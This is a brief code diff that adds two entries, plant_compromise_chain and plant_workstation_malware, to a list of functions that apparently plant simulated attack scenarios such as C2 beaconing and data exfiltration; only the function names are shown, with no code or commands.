     plant_c2_beaconing, plant_data_exfil, plant_priv_esc, plant_lateral_movement,
-    plant_insider_access, plant_port_scan, plant_log_tampering,
+    plant_insider_access, plant_port_scan, plant_log_tampering, plant_compromise_chain,
+    plant_workstation_malware,
 ]
